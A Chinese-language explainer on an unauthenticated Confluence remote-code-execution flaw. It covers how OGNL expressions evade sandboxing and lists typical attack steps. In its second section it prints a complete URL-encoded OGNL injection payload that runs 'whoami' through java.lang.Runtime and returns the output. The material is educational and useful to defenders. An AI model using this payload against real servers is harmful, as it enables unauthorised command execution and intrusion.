### 讲讲 Confluence RCE

**1. 漏洞原理**

这个漏洞的本质是一个**未授权的远程代码执行（RCE）漏洞**。它存在于 Confluence 的**管理控制台**中，特别是在处理**配置文件**时

攻击者可以利用 Confluence 的某些配置页面（通常与**数据源配置**或**诊断**相关），向服务器发送一个特制的 HTTP 请求。这个请求中包含一个恶意的**OGNL（Object-Graph Navigation Language）表达式**

- **OGNL** 是一个强大的表达式语言，常用于 Java 应用中，可以用来在运行时操作 Java 对象
- **攻击者利用**：攻击者利用了 Confluence 在处理某些未授权页面时，OGNL 表达式没有被正确沙盒化（sandboxed）或过滤的缺陷。这使得攻击者可以在不进行身份验证的情况下，直接传入 OGNL 表达式，并让服务器执行
- **执行恶意代码**：当服务器解析并执行这个恶意的 OGNL 表达式时，攻击者就可以调用 `java.lang.Runtime` 等 Java 类，从而在服务器上执行任意的系统命令

这个漏洞的危害性极高，因为它完全不需要任何身份验证，攻击者可以直接在网络上扫描到存在漏洞的 Confluence 实例，然后利用它进行攻击

**2. 漏洞利用方式**

利用这个漏洞通常非常简单，因为攻击者只需要向特定的 URL 发送一个带有恶意 OGRL 表达式的 HTTP 请求即可

一个典型的利用过程如下：

1. **探测目标**：攻击者首先会扫描互联网，寻找暴露在公网上的 Confluence Data Center 和 Server 实例

2. **发送恶意请求**：攻击者向 Confluence 服务器的某个特定管理 URL 发送一个带有恶意 OGNL Payload 的 GET 或 POST 请求。例如，请求中可能包含如下代码：

   ```apl
   ?diagnostics=x&x=x'%2b#_memberAccess.allowPrivateAccess%3dtrue%2c#_memberAccess.allowProtectedAccess%3dtrue%2c#_memberAccess.allowPackageProtected%3dtrue%2c#_memberAccess.allowStaticMethodAccess%3dtrue%2c#cmd%3d'whoami'%2c#a%3d@java.lang.Runtime@getRuntime().exec(#cmd).getInputStream().readAllBytes()%2c#out%3dnew+java.lang.String(#a)%2c#_memberAccess.allowPrivateAccess%3dfalse%2c#_memberAccess.allowProtectedAccess%3dfalse%2c#_memberAccess.allowPackageProtected%3dfalse%2c#_memberAccess.allowStaticMethodAccess%3dfalse%2c#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter().print(#out)%2c#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter().flush()
   ```

   - **OGNL 表达式解析**：上面的表达式通过反射调用了 `java.lang.Runtime.exec()` 方法，并执行了 `whoami` 命令，最后将命令执行结果写入到 HTTP 响应中，返回给攻击者

3. **获取控制权**：如果攻击成功，攻击者就可以在服务器上执行任意命令，例如下载恶意文件、创建新的用户、或者将服务器作为跳板攻击内网